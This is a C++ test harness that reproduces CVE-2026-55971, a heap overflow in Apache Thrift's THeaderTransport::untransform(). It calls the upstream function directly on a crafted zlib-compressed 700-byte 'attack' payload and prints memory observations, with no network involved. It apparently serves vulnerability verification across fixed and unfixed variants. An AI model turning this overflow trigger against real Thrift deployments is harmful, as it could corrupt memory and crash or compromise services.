// CVE-2026-55971 — Apache Thrift THeaderTransport::untransform() heap overflow.
// Direct-call harness: the complete upstream function is pasted verbatim from a
// byte-exact pinned blob via VARIANT_INC; only its object environment is stubbed.
// No server, socket, Thrift process, protocol exchange or network is involved.
#include <zlib.h>

#include <algorithm>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <string>
#include <vector>

namespace apache {
namespace thrift {

class TApplicationException {
 public:
  enum exceptionType { MISSING_RESULT = 6 };
  TApplicationException(exceptionType t, const std::string& m) : type_(t), msg_(m) {}
  exceptionType type_;
  std::string msg_;
};

namespace transport {

using std::vector;

// Minimal stand-in for the shared_ptr buffer used by upstream THeaderTransport.
class Buf {
 public:
  Buf() : p_(nullptr) {}
  uint8_t* get() const { return p_; }
  void reset(uint8_t* p) { p_ = p; }
  void swap(Buf& other) { std::swap(p_, other.p_); }
  uint8_t* p_;
};

class THeaderTransport {
 public:
  THeaderTransport() : rBufSize_(0), tBufSize_(1024), wBufSize_(512), setCalls_(0) {}

  // Stubbed environment: the function under test is included below, verbatim.
  void resizeTransformBuffer();
  void setReadBuffer(uint8_t* ptr, uint32_t sz);
  void untransform(uint8_t* ptr, uint32_t sz);

  enum { ZLIB_TRANSFORM = 0x01 };

  Buf rBuf_;
  Buf tBuf_;
  uint32_t rBufSize_;
  uint32_t tBufSize_;
  uint32_t wBufSize_;
  vector<uint16_t> readTrans_;
  uint8_t* setPtr_ = nullptr;
  uint32_t setSize_ = 0;
  uint32_t setCalls_ = 0;
};

// Mirrors pinned THeaderTransport.cpp v0.23.0:318-324 (resizeTransformBuffer),
// but is a stub: it is not the function under test and carries no pin.
void THeaderTransport::resizeTransformBuffer() {
  if (tBufSize_ < wBufSize_ + 512) {
    uint32_t new_size = wBufSize_ + 512;
    tBuf_.reset(new uint8_t[new_size]);
    tBufSize_ = new_size;
  }
}

void THeaderTransport::setReadBuffer(uint8_t* ptr, uint32_t sz) {
  setPtr_ = ptr;
  setSize_ = sz;
  ++setCalls_;
}

}  // namespace transport
}  // namespace thrift
}  // namespace apache

// The verbatim upstream member definition needs its class and exception type
// visible at file scope; unqualified names inside it still resolve through the
// class's own enclosing namespace (apache::thrift::transport).
using apache::thrift::TApplicationException;
using apache::thrift::transport::THeaderTransport;
using std::vector;
// Complete upstream untransform() from one pinned blob. The #line header in
// each generated slice makes ASan and gdb attribute the fault to that pin.
#include VARIANT_INC

using apache::thrift::TApplicationException;
using apache::thrift::transport::THeaderTransport;

static const uint32_t N_ATTACK = 700;   // upstream regression-test payload size
static const uint32_t N_SAFE = 4;
static const uint32_t N_OVERSIZE = 4096; // exceeds the 1024-byte transform buffer

static void make_payload(std::vector<uint8_t>& out, uint32_t n, bool markers) {
  out.assign(n, 0x42);
  if (markers) {
    const uint32_t offs[] = {0, 16, 32, 64, 128, 256, 699};
    const uint8_t vals[] = {0x41, 0x5a, 0x7a, 0x3c, 0x7b, 0x42, 0x7b};
    for (uint32_t i = 0; i < sizeof(offs) / sizeof(offs[0]); ++i) {
      if (offs[i] < n) out[offs[i]] = vals[i];
    }
  }
}

int main(int argc, char** argv) {
  const char* mode = (argc > 1) ? argv[1] : "attack";
  bool safe = (std::strcmp(mode, "safe") == 0);
  bool oversize = (std::strcmp(mode, "oversize") == 0);
  uint32_t n = safe ? N_SAFE : (oversize ? N_OVERSIZE : N_ATTACK);

  std::vector<uint8_t> payload;
  make_payload(payload, n, !safe && !oversize);

  std::vector<uint8_t> comp(compressBound(payload.size()));
  uLongf comp_len = comp.size();
  if (compress2(comp.data(), &comp_len, payload.data(), payload.size(), Z_DEFAULT_COMPRESSION) != Z_OK) {
    std::printf("COMPRESS_FAILED\n");
    return 90;
  }
  comp.resize(comp_len);

  THeaderTransport t;
  // The real reader sizes rBuf_ from the attacker's uint32 frame length via
  // ensureReadBuffer(sz) (pinned v0.23.0:121) and calls untransform() with ptr
  // at the start of the data section. Model that exactly with a frame-sized heap
  // destination; the transform buffer is wBufSize_(512)+DEFAULT_BUFFER_SIZE=1024.
  uint8_t* dst = new uint8_t[comp.size()];
  std::memcpy(dst, comp.data(), comp.size());  // received compressed frame data
  uint8_t* sink = new uint8_t[4096];
  std::memset(sink, 0xCC, 4096);
  uint8_t* tbuf = new uint8_t[1024];
  const uint8_t* orig_tbuf = tbuf;  // fix swaps tBuf_, so keep the original address
  std::memset(tbuf, 0xDD, 1024);
  t.rBuf_.reset(dst);
  t.rBufSize_ = static_cast<uint32_t>(comp.size());
  t.tBuf_.reset(tbuf);
  t.readTrans_.push_back(THeaderTransport::ZLIB_TRANSFORM);

  std::printf("VARIANT=%s MODE=%s COMPRESSED_LEN=%lu DECOMPRESSED_LEN=%u DEST_BYTES=%lu OVERFLOW_BYTES=%ld TBUF_SIZE=%u\n",
              VARIANT_NAME, mode, (unsigned long)comp.size(), n,
              (unsigned long)comp.size(), (long)n - (long)comp.size(), t.tBufSize_);

  bool threw = false;
  try {
    t.untransform(dst, static_cast<uint32_t>(comp.size()));
  } catch (const TApplicationException& e) {
    threw = true;
    std::printf("THREW=%d MSG=%s\n", e.type_, e.msg_.c_str());
  }
  (void)threw;

  std::printf("SET_CALLS=%u SET_SIZE=%u SETPTR_IS_RBUF=%d SETPTR_IS_ORIG_TBUF=%d\n",
              t.setCalls_, t.setSize_, t.setPtr_ == dst ? 1 : 0, t.setPtr_ == orig_tbuf ? 1 : 0);

  std::printf("DST_UNCHANGED=%d\n", std::memcmp(dst, comp.data(), comp.size()) == 0 ? 1 : 0);
  const long sink_dist = sink - dst;
  std::printf("SINK_DIST=%ld SINK_BYTE_1=%02x SINK_BYTE_8=%02x SINK_BYTE_16=%02x\n",
              sink_dist, sink[1], sink[8], sink[16]);

  const uint32_t offs[] = {0, 16, 32, 64, 128, 256, 699};
  const bool smeared = (std::memcmp(dst, comp.data(), comp.size()) != 0);
  for (uint32_t i = 0; i < sizeof(offs) / sizeof(offs[0]); ++i) {
    if (offs[i] >= n) continue;
    // A fixed build leaves the frame buffer intact; reading past it there
    // would be a harness artefact, not an observation of the upstream bug.
    if (offs[i] < comp.size() || smeared) {
      std::printf("OBS_OFFSET_%u=%02x\n", offs[i], dst[offs[i]]);
    } else {
      std::printf("OBS_OFFSET_%u=OOB\n", offs[i]);
    }
  }
  std::printf("TBUF_OBS_0=%02x\n", orig_tbuf[0]);
  // Keep the sink and transform buffer live until every observation is printed.
  std::printf("SINK_TAG=%02x TBUF_TAG=%02x\n", sink[4095], orig_tbuf[1023]);
  return 0;
}
